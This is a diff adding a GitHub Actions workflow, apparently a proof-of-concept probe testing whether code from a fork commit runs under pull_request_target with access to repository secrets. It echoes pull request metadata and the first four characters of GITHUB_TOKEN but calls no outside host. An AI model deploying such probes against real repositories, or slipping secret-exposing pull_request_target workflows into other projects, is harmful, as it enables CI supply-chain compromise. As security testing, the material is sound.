@@ -1,0 +1,23 @@
+name: evil-prt-from-fork-commit
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened, edited]
+permissions:
+  contents: read
+jobs:
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+      - name: prove attacker code ran
+        run: |
+          echo "EVIL_FROM_FORK_COMMIT=YES"
+          echo "actor=${{ github.actor }}"
+          echo "event=${{ github.event_name }}"
+          echo "base_ref=${{ github.event.pull_request.base.ref }}"
+          echo "base_sha=${{ github.event.pull_request.base.sha }}"
+          echo "head_ref=${{ github.event.pull_request.head.ref }}"
+          echo "head_sha=${{ github.event.pull_request.head.sha }}"
+          echo "secret_present=${{ secrets.GITHUB_TOKEN != '' }}"
+          echo "token_prefix=${TOKEN:0:4}"
+        env:
+          TOKEN: ${{ secrets.GITHUB_TOKEN }}
